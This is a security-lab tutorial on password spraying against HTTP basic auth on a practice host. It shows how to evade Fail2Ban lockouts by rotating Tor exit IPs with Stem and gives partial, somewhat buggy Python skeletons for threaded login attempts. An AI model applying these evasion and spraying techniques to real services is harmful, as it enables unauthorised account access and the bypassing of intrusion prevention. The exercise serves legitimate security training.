# Introduction
In this python3 coding exercise you will learn how to connect and authenticate to a `http`, `ssh` and `ftp` service in python3. 

```
                            +--------------+--------------+
                            |              |              |
                            |              |    http      |
                            |              |              |
+------------------+        |              |              |
|  python3 solver  +------->+  fail2ban    |    ssh       |
+------------------+        |              |              |
                            |              |              |
                            |              |    ftp       |
                            |              |              |
                            +--------------+--------------+
```

## Learn how to

* bypass common intrusion prevention systems used for web services
* perform a password spraying attack

## Tasks

* Task 1: Analyze the behavior of Fail2Ban
* Task 2: Analyze the Challenge 
* Task 3: Tor installation and setup
* Task 4: Password Spraying using Python

## Preparation

```bash
mkdir -p /opt/git
cd /opt/git
git clone https://github.com/ibuetler/p3s-dynamic-client-ip-password-spraying.git
cd /opt/git/p3s-dynamic-client-ip-password-spraying
pipenv --python 3 sync
pipenv --python 3 shell
```



# Analyzing Fail2Ban

![Fail2Ban-Service](/media/challenge/png/fail2ban.png)

## Step 1

### Resource

* Get the canonical name from `RESOURCES`
* The three services are running on:
  * HTTP: port `80`
  * FTP: port `21`
  * SSH: port `22`

## Step 2

### Analysis of Fail2Ban

Fail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks. Fail2Ban operates by monitoring log files for `failed login attempts` and blocks selected IP addresses that may belong to hosts that are trying to breach the system's security. 

* The intrusion detection tool `fail2ban` is activated on the host. 
* lockout period is set to 10 minutes

Send some requests to one of the services trying to authenticate with some random username and password. Make sure to count each of your requests so you know how many failed login attempts are possible before your IP gets banned.

For `HTTP` you can use curl and Basic authentication as follows:

```bash
curl https://user:password@pwspray.vm.vuln.land
```

When using curl you'll get to see the plain text HTML sent by the server:

```bash
root@hlkali:/home/hacker# curl http://user:password@pwspray.vm.vuln.land
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at pwspray.vm.vuln.land Port 80</address>
</body></html>
```

After a few requests using the same command over and over again your request will time out as your IP got blocked by Fail2Ban.

```bash
root@hlkali:/home/hacker# curl http://user:password@pwspray.vm.vuln.land
curl: (28) Failed to connect to pwspray.vm.vuln.land port 80: Connection timed out
```

# Analyzing the Challenge

Your challenge isn't to crack a password to a given user as modern services are mostly protected by blocking a users login for a period of time if the password was entered wrong a couple of times. Therefore you'll make use of an attack called **password spraying**.

## Step 1

### Password Spraying Theory

Password spraying is a fling-mud-against-the-wall type of brute-force attack in which a malicious actor uses a single password against targeted user accounts before trying other passwords until one works. The tactic enables the hacker to remain undetected by avoiding rapid or frequent account lockouts. Attacks are typically launched against businesses and other organizations.

## Step 2

### Password Spraying Server

The password spraying server has some hints for you prepared when heading to https://pwspray.vm.vuln.land/. 

1. Every service has 500 accounts set

2. The password will change every 60 minutes

3. The services are **fail2ban** protected with a 10 minutes lockout period
4. Every service has its unique user database (they are not shared)

![Password Spraying Server](/media/challenge/png/password-spraying-server.png)

**Hint: ** The server runs two different websites your *attack target* will be running on port `80` not on port `443` and isn't using SSL! 

### Clarification

Your challenge is to find the correct username to the given password in an automated manner. The range of users is limited to 500 users to speed things up.

# Tor setup

To prevent your IP from getting blocked by intrusion prevention systems you can use `Tor` to change your public IP every now and then.

## Step 1

### Install Tor

```bash
apt install tor
```

## Step 2

### Configuration

As you want to change your IP from time to time you have to configure *Tor* allowing yourself to request identity renewal.

``` bash
nano /etc/tor/torrc
```

Add the following two lines to the open file.

```
ControlPort 9051
CookieAuthentication 1
```

## Step 3

### Testing

Before you can make a request over *Tor* you'll have to start the service.

``` bash
service tor start
```

Now test your *Tor setup* with the following curl.

```bash
curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs
```

You should get `Congratulations. This browser is configured to use Tor`.

# Password Spraying HTTP Basic Auth

## Step 1

### Control Tor

Write a function *renew_ip()* that uses [Stem](https://stem.torproject.org/index.html) to get a new IP-Address.  With Stem you can control your *Tor socket* using the port we've configured in *Tor setup -> Step 2*. The `c.signal(Signal.NEWNYM)` creates a new circuit (route) but does not necessarily change your public IP-Address, you have to make sure you've received a new IP-Address yourself.

 ```python
from stem import Signal
from stem.control import Controller

def renew_ip():
	with Controller.from_port(port = 9051) as c:
		c.authenticate(password='password')
		c.signal(Signal.NEWNYM)
	
	# Your code goes here, make sure to get an "unused" IP ;)
 ```

### Check your IP

You can check your IP by sending a GET-Request to http://icanhazip.com. In order to use the socket created by *Tor* use *requests* and set its property *proxies* accordingly.

```python
import requests

def get_ip():
    response = requests.get("http://icanhazip.com"), proxies={'http': 'socks5h://127.0.0.1:9050'})
    return response.text

# returns the IP as a string
```

## Step 2

### Start the Attack

Write a function *try_login(credentials)* that takes a tuple as an argument containing the *username* and the *password*. Send a GET-Request using [requests](https://requests.readthedocs.io/en/master/).  You'll have to provide three arguments to your request: *url*, *proxies* and *auth*.

Make sure to return the credentials plus the status code of the request in order to track down a successful login. 

```python
import requests

def try_login(credentials):
    # Your code goes here
```

## Step 3

### Parallelize your requests

You can speed up your *password spraying program* by parallelizing your requests using [concurrent.futures](https://docs.python.org/3/library/concurrent.futures.html).

As we have can only have as many simultaneous threads as Fail2Ban allows failed login attempts from the same IP we have to limit the tasks running.

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

with ThreadPoolExecutor() as executor:
    current_user = 140000
    end_user = 140500
    
    while current_user <= end_user:
        tasks = list()
        
        # limit running threads (batching), change range according to Fail2Ban policy
        for offset in range(0, 10)
        	current_user += 1
        	tasks.append(
            	executor.submit(
                	try_login, (f'user_{current_user}', 'password')
                )
            )
            current_user += 1
        
        renew_IP()
        
        # wait for the tasks to complete
        for task in as_completed(tasks):
            print(task.result())
        
```

